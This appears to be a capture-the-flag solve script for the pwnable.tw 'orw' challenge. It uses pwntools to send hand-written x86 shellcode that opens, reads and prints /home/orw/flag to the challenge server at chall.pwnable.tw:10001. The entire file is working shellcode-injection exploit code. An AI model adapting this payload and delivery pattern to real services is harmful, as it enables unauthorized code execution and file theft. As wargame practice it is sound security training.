from pwn import *

# Constants found by manual enumeration
SHELLCODE = (b'\xeb\x3a\x5b\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x05\x00'
             b'\x00\x00\xcd\x80\x89\xc3\x89\xe1\xba\x30\x00\x00\x00\xb8\x03\x00'
             b'\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80'
             b'\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xc1\xff\xff'
             b'\xff\x2f\x68\x6f\x6d\x65\x2f\x6f\x72\x77\x2f\x66\x6c\x61\x67\x00'
             b'\x41'
            )


p = remote('chall.pwnable.tw', 10001)

p.recvuntil(b'Give my your shellcode:')

p.sendline(SHELLCODE)

p.interactive()

